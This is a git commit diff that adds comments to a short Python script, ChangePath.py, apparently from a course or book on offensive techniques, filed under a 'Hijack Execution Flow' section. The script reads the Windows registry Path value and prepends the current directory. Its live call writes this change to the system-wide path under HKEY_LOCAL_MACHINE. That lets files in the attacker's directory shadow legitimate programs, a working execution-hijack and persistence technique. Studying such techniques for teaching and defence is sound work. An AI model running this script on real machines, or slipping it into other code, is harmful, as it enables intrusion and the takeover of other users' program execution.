fa5085e25eda1b70a6e1bf9e5581e60c54849f03
noesis <79380418+nemo-nesciam@users.noreply.github.com>
2024-06-16 19:29:34 -0400

    Added comments to ChangePath.py

--- Part_5/5.2_Hijack_Execution_Flow/ChangePath.py
+++ Part_5/5.2_Hijack_Execution_Flow/ChangePath.py
@@ -1,21 +1,24 @@
+# Import necessary modules for file operations and registry manipulation
 import os, winreg
 
+# Function to read the 'Path' value from the registry
 def readPathValue(reghive,regpath):
-    reg = winreg.ConnectRegistry(None,reghive)
-    key = winreg.OpenKey(reg,regpath,access=winreg.KEY_READ)
+    reg = winreg.ConnectRegistry(None,reghive)  # Connect to the registry hive
+    key = winreg.OpenKey(reg,regpath,access=winreg.KEY_READ) # Open the registry key with read access
     index = 0
     while True:
-        val = winreg.EnumValue(key,index)
-        if val[0] == "Path":
-            return val[1]
+        val = winreg.EnumValue(key,index) # Enumerate through the registry values
+        if val[0] == "Path":  # Check if the value is 'Path'
+            return val[1]  # Return the 'Path' value
         index += 1
 
+# Function to edit the 'Path' value in the registry
 def editPathValue(reghive,regpath,targetdir):
-    path = readPathValue(reghive,regpath)
-    newpath = targetdir + ";" + path
-    reg = winreg.ConnectRegistry(None,reghive)
-    key = winreg.OpenKey(reg,regpath,access=winreg.KEY_SET_VALUE)
-    winreg.SetValueEx(key,"Path",0,winreg.REG_EXPAND_SZ,newpath)
+    path = readPathValue(reghive,regpath) # Read the current 'Path' value 
+    newpath = targetdir + ";" + path # Add the target directory to the existing 'Path'
+    reg = winreg.ConnectRegistry(None,reghive) # Connect to the registry hive
+    key = winreg.OpenKey(reg,regpath,access=winreg.KEY_SET_VALUE) # Open the registry key with write access
+    winreg.SetValueEx(key,"Path",0,winreg.REG_EXPAND_SZ,newpath)  # Set the new 'Path' value in the registry
     
 # Modify user path
 #reghive = winreg.HKEY_CURRENT_USER
@@ -25,6 +28,6 @@ targetdir = os.getcwd()
 #editPathValue(reghive,regpath,targetdir)
 
 # Modify SYSTEM path
-reghive = winreg.HKEY_LOCAL_MACHINE
-regpath = "SYSTEM\CurrentControlSet\Control\Session Manager\Environment"
-editPathValue(reghive,regpath,targetdir)
+reghive = winreg.HKEY_LOCAL_MACHINE # Set the registry hive to HKEY_LOCAL_MACHINE
+regpath = "SYSTEM\CurrentControlSet\Control\Session Manager\Environment"  # Set the registry path for the system environment
+editPathValue(reghive,regpath,targetdir)  # Edit the system 'Path' value
